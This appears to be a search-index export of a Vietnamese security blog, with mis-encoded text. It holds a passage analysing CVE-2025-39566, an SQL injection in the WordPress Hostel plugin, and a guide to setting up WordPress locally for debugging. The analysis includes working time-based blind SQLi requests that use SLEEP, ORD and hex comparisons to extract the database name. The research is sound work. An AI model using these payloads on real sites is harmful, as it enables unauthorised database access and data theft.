add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) vÃ  v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« \u003cstrong\u003eGET\u003c/strong\u003e request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\nRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ 